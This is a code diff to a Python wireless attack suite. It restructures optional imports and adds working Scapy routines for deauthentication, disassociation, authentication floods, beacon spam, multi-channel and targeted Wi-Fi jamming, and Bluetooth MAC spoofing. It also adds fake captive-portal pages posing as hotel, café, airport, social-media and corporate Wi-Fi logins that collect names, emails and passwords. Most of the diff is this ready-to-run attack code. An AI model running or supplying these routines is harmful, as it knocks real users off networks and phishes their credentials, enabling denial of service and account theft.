@@ -27,85 +27,56 @@ from threading import Thread, Event
 from queue import Queue, Empty
 import logging
 
+# Global variables for optional imports
+scapy_available = False
+psutil_available = False
+requests_available = False
+netaddr_available = False
+
 try:
     from scapy.all import *
     from scapy.layers.dot11 import *
+    scapy_available = True
+except ImportError:
+    pass
+
+try:
     import psutil
+    psutil_available = True
+except ImportError:
+    pass
+
+try:
     import requests
-    from colorama import init, Fore, Back, Style
+    requests_available = True
+except ImportError:
+    pass
+
+try:
     import netaddr
+    netaddr_available = True
+except ImportError:
+    pass
+
+try:
+    from colorama import init, Fore, Back, Style
     init()
-except ImportError as e:
-    print(f"[!] Missing required module: {e}")
-    print("[*] Installing dependencies...")
-    try:
-        # Install individual packages that are commonly missing
-        missing_packages = []
-        
-        try:
-            from scapy.all import *
-            from scapy.layers.dot11 import *
-        except ImportError:
-            missing_packages.append('scapy')
-        
-        try:
-            import psutil
-        except ImportError:
-            missing_packages.append('psutil')
-        
-        try:
-            import requests
-        except ImportError:
-            missing_packages.append('requests')
-        
-        try:
-            from colorama import init, Fore, Back, Style
-        except ImportError:
-            missing_packages.append('colorama')
-        
-        try:
-            import netaddr
-        except ImportError:
-            missing_packages.append('netaddr')
-        
-        if missing_packages:
-            for package in missing_packages:
-                print(f"[*] Installing {package}...")
-                subprocess.run([sys.executable, '-m', 'pip', 'install', package], 
-                              check=True, capture_output=True)
-        
-        # Re-import after installation
-        from scapy.all import *
-        from scapy.layers.dot11 import *
-        import psutil
-        import requests
-        from colorama import init, Fore, Back, Style
-        import netaddr
-        init()
-        print("[+] Dependencies installed successfully")
-    except (subprocess.CalledProcessError, ImportError) as install_error:
-        print(f"[!] Failed to install dependencies: {install_error}")
-        print(f"[*] Please install manually: pip3 install scapy psutil requests colorama netaddr")
-        # Continue with limited functionality
-        try:
-            from colorama import init, Fore, Back, Style
-            init()
-        except:
-            # Fallback color definitions if colorama fails
-            class Fore:
-                RED = '\033[31m'
-                GREEN = '\033[32m'
-                YELLOW = '\033[33m'
-                BLUE = '\033[34m'
-                MAGENTA = '\033[35m'
-                CYAN = '\033[36m'
-                WHITE = '\033[37m'
-            
-            class Back:
-                BLACK = '\033[40m'
-            
-            class Style:
-                RESET_ALL = '\033[0m'
+except ImportError:
+    # Fallback color definitions if colorama fails
+    class Fore:
+        RED = '\033[31m'
+        GREEN = '\033[32m'
+        YELLOW = '\033[33m'
+        BLUE = '\033[34m'
+        MAGENTA = '\033[35m'
+        CYAN = '\033[36m'
+        WHITE = '\033[37m'
+    
+    class Back:
+        BLACK = '\033[40m'
+    
+    class Style:
+        RESET_ALL = '\033[0m'
 
 class RealWiFiScanner:
     """Real WiFi scanner with multiple detection methods"""
@@ -204,6 +175,10 @@ class RealWiFiScanner:
     
     def scan_with_scapy(self, duration=30):
         """Real scanning using Scapy packet capture"""
+        if not scapy_available:
+            print(f"{Fore.RED}[!] Scapy not available{Style.RESET_ALL}")
+            return []
+            
         networks = {}
         
         def packet_handler(packet):
@@ -288,11 +263,6 @@ class RealWiFiScanner:
         
         try:
             print(f"[*] Starting Scapy packet capture for {duration} seconds...")
-            # Check if scapy is available
-            if 'sniff' not in globals():
-                print(f"{Fore.RED}[!] Scapy not properly imported{Style.RESET_ALL}")
-                return []
-            
             sniff(iface=self.interface, prn=packet_handler, timeout=duration, store=False)
         except PermissionError:
             print(f"{Fore.RED}[!] Permission denied. Run as root for raw socket access{Style.RESET_ALL}")
@@ -371,6 +341,10 @@ class RealHandshakeCapture:
     
     def capture_with_scapy(self, bssid, channel, output_file, timeout):
         """Capture using Scapy"""
+        if not scapy_available:
+            print(f"{Fore.RED}[!] Scapy not available for packet capture{Style.RESET_ALL}")
+            return None
+            
         packets = []
         handshake_packets = []
         
@@ -426,6 +400,10 @@ class RealHandshakeCapture:
     
     def send_deauth_scapy(self, target_bssid):
         """Send deauth packets using Scapy"""
+        if not scapy_available:
+            print(f"{Fore.YELLOW}[*] Scapy not available for deauth attack{Style.RESET_ALL}")
+            return
+            
         try:
             # Broadcast deauth
             broadcast = "ff:ff:ff:ff:ff:ff"
@@ -758,8 +736,7 @@ class WiFiArsenal:
 
 {Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════════╗
 ║                     WiFi Penetration Testing Suite v{self.version}                    ║
-║                                                                                        
-║                                                   
+║                          Developed by {self.author}                             ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
 
 {Fore.GREEN}   🔥 FULL FEATURES:
@@ -2340,6 +2317,10 @@ done
             
             # Use Scapy to flood beacons
             try:
+                if not scapy_available:
+                    print(f"{Fore.RED}[!] Scapy not available for beacon flood{Style.RESET_ALL}")
+                    return
+                    
                 for duration_left in range(duration, 0, -1):
                     for ssid in fake_ssids[:10]:  # Limit to prevent overwhelming
                         # Random MAC address
@@ -2834,6 +2815,170 @@ if __name__ == "__main__":
         except ValueError:
             print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
     
+    def disassoc_attack(self):
+        """Disassociation attack on selected target"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] No target networks available{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target for disassoc attack: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                packet_count = int(input(f"{Fore.CYAN}[?] Number of disassoc packets (default: 10): {Style.RESET_ALL}") or "10")
+                
+                print(f"{Fore.YELLOW}[*] Sending disassociation packets to {target['essid']}...{Style.RESET_ALL}")
+                
+                if not scapy_available:
+                    print(f"{Fore.RED}[!] Scapy not available for disassoc attack{Style.RESET_ALL}")
+                    return
+                
+                bssid = target['bssid']
+                broadcast = "ff:ff:ff:ff:ff:ff"
+                
+                for i in range(packet_count):
+                    # Disassoc frame
+                    disassoc = RadioTap() / Dot11(
+                        addr1=broadcast,
+                        addr2=bssid,
+                        addr3=bssid
+                    ) / Dot11Disas(reason=8)
+                    
+                    sendp(disassoc, iface=self.monitor_interface, verbose=False)
+                    time.sleep(0.1)
+                
+                print(f"{Fore.GREEN}[+] Disassociation attack completed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def beacon_spam(self):
+        """Beacon spam attack"""
+        print(f"{Fore.YELLOW}[*] Starting beacon spam attack...{Style.RESET_ALL}")
+        
+        if not scapy_available:
+            print(f"{Fore.RED}[!] Scapy not available for beacon spam{Style.RESET_ALL}")
+            return
+        
+        spam_count = int(input(f"{Fore.CYAN}[?] Number of fake beacons (default: 100): {Style.RESET_ALL}") or "100")
+        
+        for i in range(spam_count):
+            # Random SSID and MAC
+            fake_ssid = f"FakeAP_{i:03d}"
+            fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+            
+            # Create beacon
+            beacon = RadioTap() / Dot11(
+                type=0, subtype=8,
+                addr1="ff:ff:ff:ff:ff:ff",
+                addr2=fake_mac,
+                addr3=fake_mac
+            ) / Dot11Beacon() / Dot11Elt(ID="SSID", info=fake_ssid)
+            
+            sendp(beacon, iface=self.monitor_interface, verbose=False)
+            
+            if i % 10 == 0:
+                print(f"[*] Sent {i} beacons...")
+        
+        print(f"{Fore.GREEN}[+] Beacon spam completed ({spam_count} beacons sent){Style.RESET_ALL}")
+    
+    def auth_flood(self):
+        """Authentication flood attack"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] No target networks available{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target for auth flood: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                flood_count = int(input(f"{Fore.CYAN}[?] Number of auth packets (default: 100): {Style.RESET_ALL}") or "100")
+                
+                print(f"{Fore.YELLOW}[*] Starting authentication flood on {target['essid']}...{Style.RESET_ALL}")
+                
+                if not scapy_available:
+                    print(f"{Fore.RED}[!] Scapy not available for auth flood{Style.RESET_ALL}")
+                    return
+                
+                bssid = target['bssid']
+                
+                for i in range(flood_count):
+                    # Random client MAC
+                    client_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                    
+                    # Auth frame
+                    auth = RadioTap() / Dot11(
+                        addr1=bssid,
+                        addr2=client_mac,
+                        addr3=bssid
+                    ) / Dot11Auth(seqnum=1)
+                    
+                    sendp(auth, iface=self.monitor_interface, verbose=False)
+                    
+                    if i % 20 == 0:
+                        print(f"[*] Sent {i} auth packets...")
+                
+                print(f"{Fore.GREEN}[+] Authentication flood completed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def custom_injection(self):
+        """Custom packet injection"""
+        print(f"{Fore.MAGENTA}[*] Custom Packet Injection{Style.RESET_ALL}")
+        
+        if not scapy_available:
+            print(f"{Fore.RED}[!] Scapy not available for custom injection{Style.RESET_ALL}")
+            return
+        
+        print("Custom injection options:")
+        print("1. Deauth with custom reason")
+        print("2. Probe request flood")
+        print("3. Management frame injection")
+        
+        try:
+            choice = input(f"{Fore.CYAN}[?] Select injection type: {Style.RESET_ALL}").strip()
+            
+            if choice == '1':
+                target_mac = input(f"{Fore.CYAN}[?] Target MAC address: {Style.RESET_ALL}").strip()
+                reason = int(input(f"{Fore.CYAN}[?] Deauth reason code (1-65534): {Style.RESET_ALL}") or "7")
+                count = int(input(f"{Fore.CYAN}[?] Packet count: {Style.RESET_ALL}") or "10")
+                
+                for i in range(count):
+                    deauth = RadioTap() / Dot11(
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=target_mac,
+                        addr3=target_mac
+                    ) / Dot11Deauth(reason=reason)
+                    
+                    sendp(deauth, iface=self.monitor_interface, verbose=False)
+                
+                print(f"{Fore.GREEN}[+] Custom deauth injection completed{Style.RESET_ALL}")
+            
+            elif choice == '2':
+                ssid = input(f"{Fore.CYAN}[?] SSID to probe for: {Style.RESET_ALL}").strip()
+                count = int(input(f"{Fore.CYAN}[?] Probe count: {Style.RESET_ALL}") or "50")
+                
+                for i in range(count):
+                    client_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                    
+                    probe = RadioTap() / Dot11(
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=client_mac,
+                        addr3="ff:ff:ff:ff:ff:ff"
+                    ) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=ssid)
+                    
+                    sendp(probe, iface=self.monitor_interface, verbose=False)
+                
+                print(f"{Fore.GREEN}[+] Probe request flood completed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+
     def deauth_storm(self):
         """Massive deauth attack on multiple networks"""
         if not self.target_networks:
@@ -2889,6 +3034,125 @@ if __name__ == "__main__":
         except ValueError:
             print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
     
+    def multi_channel_jammer(self, duration):
+        """Multi-channel jammer"""
+        print(f"{Fore.YELLOW}[*] Starting multi-channel jammer for {duration} seconds...{Style.RESET_ALL}")
+        
+        if not scapy_available:
+            print(f"{Fore.RED}[!] Scapy not available for jamming{Style.RESET_ALL}")
+            return
+        
+        channels = [1, 6, 11]  # Common 2.4GHz channels
+        end_time = time.time() + duration
+        
+        while time.time() < end_time:
+            for channel in channels:
+                # Set channel
+                try:
+                    subprocess.run(['iwconfig', self.monitor_interface, 'channel', str(channel)], 
+                                  timeout=5, capture_output=True)
+                except:
+                    pass
+                
+                # Send jamming packets
+                for _ in range(5):
+                    fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                    fake_ssid = "".join(random.choices(string.ascii_letters, k=10))
+                    
+                    beacon = RadioTap() / Dot11(
+                        type=0, subtype=8,
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=fake_mac,
+                        addr3=fake_mac
+                    ) / Dot11Beacon() / Dot11Elt(ID="SSID", info=fake_ssid)
+                    
+                    sendp(beacon, iface=self.monitor_interface, verbose=False)
+                
+                time.sleep(0.5)
+        
+        print(f"{Fore.GREEN}[+] Multi-channel jamming completed{Style.RESET_ALL}")
+    
+    def targeted_jammer(self, duration):
+        """Target specific networks for jamming"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] No target networks available{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select target to jam: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                
+                print(f"{Fore.YELLOW}[*] Jamming {target['essid']} for {duration} seconds...{Style.RESET_ALL}")
+                
+                if not scapy_available:
+                    print(f"{Fore.RED}[!] Scapy not available for jamming{Style.RESET_ALL}")
+                    return
+                
+                # Set target channel
+                try:
+                    subprocess.run(['iwconfig', self.monitor_interface, 'channel', target['channel']], 
+                                  timeout=5, capture_output=True)
+                except:
+                    pass
+                
+                end_time = time.time() + duration
+                while time.time() < end_time:
+                    # Send continuous deauth
+                    deauth = RadioTap() / Dot11(
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=target['bssid'],
+                        addr3=target['bssid']
+                    ) / Dot11Deauth(reason=7)
+                    
+                    sendp(deauth, iface=self.monitor_interface, verbose=False)
+                    time.sleep(0.01)
+                
+                print(f"{Fore.GREEN}[+] Targeted jamming completed{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def spectrum_jammer(self, duration):
+        """Full spectrum jammer across all channels"""
+        print(f"{Fore.YELLOW}[*] Starting full spectrum jammer for {duration} seconds...{Style.RESET_ALL}")
+        
+        if not scapy_available:
+            print(f"{Fore.RED}[!] Scapy not available for jamming{Style.RESET_ALL}")
+            return
+        
+        channels = list(range(1, 15))  # All 2.4GHz channels
+        end_time = time.time() + duration
+        
+        while time.time() < end_time:
+            for channel in channels:
+                # Set channel
+                try:
+                    subprocess.run(['iwconfig', self.monitor_interface, 'channel', str(channel)], 
+                                  timeout=2, capture_output=True)
+                except:
+                    pass
+                
+                # Rapid fire jamming packets
+                for _ in range(3):
+                    # Random deauth
+                    fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                    deauth = RadioTap() / Dot11(
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=fake_mac,
+                        addr3=fake_mac
+                    ) / Dot11Deauth(reason=7)
+                    
+                    sendp(deauth, iface=self.monitor_interface, verbose=False)
+                
+                if int(time.time()) % 10 == 0:
+                    remaining = int(end_time - time.time())
+                    print(f"[*] Jamming... {remaining}s remaining")
+        
+        print(f"{Fore.GREEN}[+] Full spectrum jamming completed{Style.RESET_ALL}")
+
     def channel_jammer(self, channel, duration):
         """Jam specific channel with noise"""
         print(f"{Fore.YELLOW}[*] Jamming channel {channel} for {duration} seconds...{Style.RESET_ALL}")
@@ -2965,6 +3229,110 @@ if __name__ == "__main__":
         except ValueError:
             print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
     
+    def bluetooth_service_scan(self):
+        """Scan Bluetooth services"""
+        try:
+            import bluetooth
+            
+            target_addr = input(f"{Fore.CYAN}[?] Target Bluetooth address (or 'scan' to discover): {Style.RESET_ALL}").strip()
+            
+            if target_addr.lower() == 'scan':
+                print("[*] Discovering devices first...")
+                devices = bluetooth.discover_devices(duration=10, lookup_names=True)
+                if devices:
+                    print(f"Found {len(devices)} devices:")
+                    for i, (addr, name) in enumerate(devices):
+                        print(f"  {i+1}. {addr} - {name}")
+                    
+                    choice = int(input("Select device: ")) - 1
+                    if 0 <= choice < len(devices):
+                        target_addr = devices[choice][0]
+                    else:
+                        return
+                else:
+                    print("No devices found")
+                    return
+            
+            print(f"[*] Scanning services on {target_addr}...")
+            services = bluetooth.find_service(address=target_addr)
+            
+            if services:
+                print(f"Found {len(services)} services:")
+                for service in services:
+                    print(f"  Name: {service.get('name', 'Unknown')}")
+                    print(f"  Protocol: {service.get('protocol', 'Unknown')}")
+                    print(f"  Port: {service.get('port', 'Unknown')}")
+                    print(f"  Service Class: {service.get('service-classes', 'Unknown')}")
+                    print("-" * 40)
+            else:
+                print("No services found")
+                
+        except Exception as e:
+            print(f"{Fore.RED}[!] Bluetooth service scan failed: {e}{Style.RESET_ALL}")
+    
+    def bluetooth_mac_spoof(self):
+        """Bluetooth MAC address spoofing"""
+        print(f"{Fore.YELLOW}[*] Bluetooth MAC Spoofing{Style.RESET_ALL}")
+        
+        try:
+            # Check current Bluetooth adapter
+            result = subprocess.run(['hciconfig'], capture_output=True, text=True, timeout=10)
+            if result.returncode != 0:
+                print(f"{Fore.RED}[!] No Bluetooth adapter found{Style.RESET_ALL}")
+                return
+            
+            print("Current Bluetooth configuration:")
+            print(result.stdout)
+            
+            new_mac = input(f"{Fore.CYAN}[?] New MAC address (or 'random'): {Style.RESET_ALL}").strip()
+            
+            if new_mac.lower() == 'random':
+                new_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+            
+            print(f"[*] Changing Bluetooth MAC to {new_mac}...")
+            
+            # Bring down interface
+            subprocess.run(['hciconfig', 'hci0', 'down'], timeout=10)
+            
+            # Change MAC (requires bdaddr tool)
+            if self.command_exists('bdaddr'):
+                subprocess.run(['bdaddr', '-i', 'hci0', new_mac], timeout=10)
+            else:
+                print(f"{Fore.YELLOW}[*] bdaddr tool not found. Install bluez-tools{Style.RESET_ALL}")
+            
+            # Bring up interface
+            subprocess.run(['hciconfig', 'hci0', 'up'], timeout=10)
+            
+            print(f"{Fore.GREEN}[+] Bluetooth MAC changed to {new_mac}{Style.RESET_ALL}")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] Bluetooth MAC spoofing failed: {e}{Style.RESET_ALL}")
+    
+    def ble_scanner(self):
+        """Bluetooth Low Energy scanner"""
+        print(f"{Fore.YELLOW}[*] Bluetooth Low Energy Scanner{Style.RESET_ALL}")
+        
+        try:
+            if self.command_exists('hcitool'):
+                print("[*] Scanning for BLE devices...")
+                result = subprocess.run(['hcitool', 'lescan'], 
+                                       capture_output=True, text=True, timeout=30)
+                
+                if result.stdout:
+                    print("BLE Devices found:")
+                    for line in result.stdout.split('\n'):
+                        if line.strip() and 'LE Scan' not in line:
+                            print(f"  {line.strip()}")
+                else:
+                    print("No BLE devices found")
+            else:
+                print(f"{Fore.RED}[!] hcitool not found. Install bluez{Style.RESET_ALL}")
+                
+        except subprocess.TimeoutExpired:
+            print(f"{Fore.YELLOW}[*] BLE scan timed out{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] BLE scan failed: {e}{Style.RESET_ALL}")
+
     def bluetooth_discovery(self):
         """Discover nearby Bluetooth devices"""
         print(f"{Fore.YELLOW}[*] Scanning for Bluetooth devices...{Style.RESET_ALL}")
@@ -3030,6 +3398,195 @@ if __name__ == "__main__":
         except ValueError:
             print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
     
+    def create_hotel_portal(self, portal_dir):
+        """Create hotel WiFi portal"""
+        portal_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Hotel WiFi Access</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial; background: linear-gradient(45deg, #1e3c72, #2a5298); margin: 0; padding: 20px; color: white; }
+        .container { max-width: 500px; margin: 50px auto; background: rgba(255,255,255,0.95); padding: 40px; border-radius: 15px; color: #333; }
+        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
+        h1 { color: #1e3c72; text-align: center; margin-bottom: 30px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #2a5298; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+        .terms { font-size: 12px; margin-top: 20px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🏨</div>
+        <h1>Welcome to Hotel Grand WiFi</h1>
+        <p style="text-align: center; color: #666;">Complimentary high-speed internet access</p>
+        <form method="post" action="/login">
+            <input type="text" name="room" placeholder="Room Number" required>
+            <input type="text" name="lastname" placeholder="Last Name" required>
+            <input type="email" name="email" placeholder="Email Address" required>
+            <button type="submit">Connect to WiFi</button>
+        </form>
+        <div class="terms">
+            By connecting, you agree to our terms of service. Connection is complimentary for hotel guests.
+        </div>
+    </div>
+</body>
+</html>"""
+        with open(f"{portal_dir}/index.html", 'w') as f:
+            f.write(portal_html)
+    
+    def create_coffee_portal(self, portal_dir):
+        """Create coffee shop portal"""
+        portal_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Coffee Shop WiFi</title>
+    <style>
+        body { font-family: 'Comic Sans MS', cursive; background: #8B4513; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: #F5DEB3; padding: 30px; border-radius: 20px; border: 3px solid #D2691E; }
+        .logo { text-align: center; font-size: 64px; margin-bottom: 20px; }
+        h1 { color: #8B4513; text-align: center; font-size: 28px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #D2691E; border-radius: 10px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #D2691E; color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; }
+        .offer { background: #FFFFE0; padding: 15px; border-radius: 10px; margin-top: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">☕</div>
+        <h1>Brew & Browse Café</h1>
+        <p style="text-align: center; color: #8B4513;">Free WiFi for our valued customers!</p>
+        <form method="post" action="/login">
+            <input type="text" name="name" placeholder="Your Name" required>
+            <input type="email" name="email" placeholder="Email for offers" required>
+            <button type="submit">Get Connected!</button>
+        </form>
+        <div class="offer">
+            <strong>☕ Special Offer!</strong><br>
+            Sign up for our newsletter and get 10% off your next visit!
+        </div>
+    </div>
+</body>
+</html>"""
+        with open(f"{portal_dir}/index.html", 'w') as f:
+            f.write(portal_html)
+    
+    def create_airport_portal(self, portal_dir):
+        """Create airport WiFi portal"""
+        portal_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Airport WiFi</title>
+    <style>
+        body { font-family: Arial; background: #003366; margin: 0; padding: 20px; color: white; }
+        .container { max-width: 500px; margin: 50px auto; background: white; padding: 40px; border-radius: 10px; color: #333; }
+        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; color: #003366; }
+        h1 { color: #003366; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0066CC; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .security { background: #E6F3FF; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">✈️</div>
+        <h1>International Airport WiFi</h1>
+        <p style="text-align: center;">Secure high-speed internet for travelers</p>
+        <form method="post" action="/login">
+            <input type="text" name="flight" placeholder="Flight Number (optional)">
+            <input type="email" name="email" placeholder="Email Address" required>
+            <input type="text" name="destination" placeholder="Destination City">
+            <button type="submit">Connect to Airport WiFi</button>
+        </form>
+        <div class="security">
+            🔒 <strong>Security Notice:</strong> This is a secure connection monitored for safety and security purposes in accordance with airport regulations.
+        </div>
+    </div>
+</body>
+</html>"""
+        with open(f"{portal_dir}/index.html", 'w') as f:
+            f.write(portal_html)
+    
+    def create_social_portal(self, portal_dir):
+        """Create social media login portal"""
+        portal_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Social WiFi Login</title>
+    <style>
+        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); }
+        .logo { text-align: center; font-size: 48px; margin-bottom: 30px; }
+        h1 { text-align: center; color: #333; margin-bottom: 30px; }
+        .social-btn { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .facebook { background: #4267B2; color: white; }
+        .google { background: #db4437; color: white; }
+        .twitter { background: #1da1f2; color: white; }
+        .divider { text-align: center; margin: 20px 0; color: #666; }
+        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📱</div>
+        <h1>Connect with Social</h1>
+        <button class="social-btn facebook">📘 Continue with Facebook</button>
+        <button class="social-btn google">🔍 Continue with Google</button>
+        <button class="social-btn twitter">🐦 Continue with Twitter</button>
+        <div class="divider">- OR -</div>
+        <form method="post" action="/login">
+            <input type="email" name="email" placeholder="Email Address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>"""
+        with open(f"{portal_dir}/index.html", 'w') as f:
+            f.write(portal_html)
+    
+    def create_custom_portal(self, portal_dir):
+        """Create custom portal"""
+        company = input(f"{Fore.CYAN}[?] Company/Organization name: {Style.RESET_ALL}").strip() or "WiFi Access"
+        theme_color = input(f"{Fore.CYAN}[?] Theme color (hex, default #2196F3): {Style.RESET_ALL}").strip() or "#2196F3"
+        
+        portal_html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>{company} WiFi</title>
+    <style>
+        body {{ font-family: Arial; background: linear-gradient(135deg, {theme_color}, #ffffff); margin: 0; padding: 20px; }}
+        .container {{ max-width: 450px; margin: 50px auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }}
+        .logo {{ text-align: center; font-size: 48px; margin-bottom: 30px; color: {theme_color}; }}
+        h1 {{ color: {theme_color}; text-align: center; margin-bottom: 30px; }}
+        input {{ width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; }}
+        input:focus {{ border-color: {theme_color}; outline: none; }}
+        button {{ width: 100%; padding: 15px; background: {theme_color}; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }}
+        button:hover {{ opacity: 0.9; }}
+        .footer {{ text-align: center; margin-top: 30px; color: #666; font-size: 14px; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🌐</div>
+        <h1>{company}</h1>
+        <p style="text-align: center; color: #666;">Please sign in to access our WiFi network</p>
+        <form method="post" action="/login">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="email" name="email" placeholder="Email Address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Connect to WiFi</button>
+        </form>
+        <div class="footer">
+            Secure connection provided by {company}<br>
+            🔒 Your privacy is protected
+        </div>
+    </div>
+</body>
+</html>"""
+        with open(f"{portal_dir}/index.html", 'w') as f:
+            f.write(portal_html)
+
     def create_corporate_portal(self, portal_dir):
         """Create corporate login portal"""
         portal_html = """<!DOCTYPE html>
